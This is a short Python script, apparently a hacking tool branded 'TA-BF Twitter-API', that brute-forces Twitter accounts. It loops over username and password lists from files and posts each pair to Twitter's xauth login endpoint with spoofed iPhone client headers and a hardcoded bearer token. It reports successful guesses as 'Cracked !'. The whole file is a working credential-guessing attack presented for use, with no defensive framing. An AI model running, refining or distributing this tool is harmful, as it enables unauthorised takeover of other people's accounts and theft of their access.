import requests
import sys, time, random


def print_logo():
    clear = "\x1b[0m"
    colors = [34 , 37]

    x = '''
	==================================
	|       TA-BF Twitter-API        |
	|     Greetz to Saudi Cybers     |
	|--------------------------------|
	|   CoDeD By TA Hacker (@391F)   |
	|--------------------------------|
	'''
    for N , line in enumerate ( x.split ( "\n" ) ):
        sys.stdout.write ( "\x1b[1;%dm%s%s\n" % (random.choice ( colors ) , line , clear) )
        time.sleep ( 0.03 )


def self():
    self.r = '\033[31m'
    self.g = '\033[32m'
    self.y = '\033[33m'
    self.b = '\033[34m'
    self.m = '\033[35m'
    self.c = '\033[36m'
    self.w = '\033[37m'


user = raw_input ( "Enter username : " )
userList = open(user).read().splitlines()
password = raw_input ( "Enter the password : " )
passList = open ( password ).read ( ).splitlines ( )


def SC():
    self.r = '\033[31m'
    self.y = '\033[33m'
    self.b = '\033[34m'
    for password in passList:
        for user in userList:
            headers = {'Host': 'api.twitter.com' ,
                       'X-Twitter-Client-DeviceID': 'FF9627DC-3D4A-4F44-A7B4-6CE223D6AE4E' ,
                       'Accept': 'application/json' ,
                       'X-Twitter-Client-Version': '7.31.2' ,
                       'X-Guest-Token': '1175189789676580864' ,
                       'X-Client-UUID': '3F66636B-8828-4708-96E6-A846B4534E46' ,
                       'X-Twitter-Client-Language': 'ar' ,
                       'X-B3-TraceId': '69fed8219c952670' ,
                       'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAAj4AQAAAAAAPraK64zCZ9CSzdLesbE7LB%2Bw4uE%3DVJQREvQNCZJNiz3rHO7lOXlkVOQkzzdsgu6wWgcazdMUaGoUGm' ,
                       'Accept-Language': 'ar' ,
                       'Accept-Encoding': 'gzip, deflate' ,
                       'Content-Type': 'application/x-www-form-urlencoded' ,
                       'Content-Length': '872' ,
                       'User-Agent': 'Twitter-iPhone/7.31.2 iOS/12.4 (Apple;iPhone8,1;;;;;1;2015)' ,
                       'Connection': 'close' ,
                       'X-Twitter-Client-Limit-Ad-Tracking': '0' ,
                       'X-Twitter-API-Version': '5' ,
                       'X-Twitter-Client': 'Twitter-iPhone' ,
                       'kdt': 'REkPLFW0VyKsqNCpjcZ1qOod0eOwJinpWAdjbFCy'}

            data = 'x_auth_identifier=' + user + '&x_auth_password=' + password + ''

            r = requests.post ( 'https://api.twitter.com/auth/1/xauth_password.json' , headers=headers ,
                                data=data ).text

            if 'errors' in r:
                print (self.r + 'Falsse => {} : {}'.format ( user , password ))

            else:
                print (self.y + 'Cracked ! => {} : {}'.format ( user , password ))

            


if __name__ == '__main__':
    print_logo()
    self()
    SC()
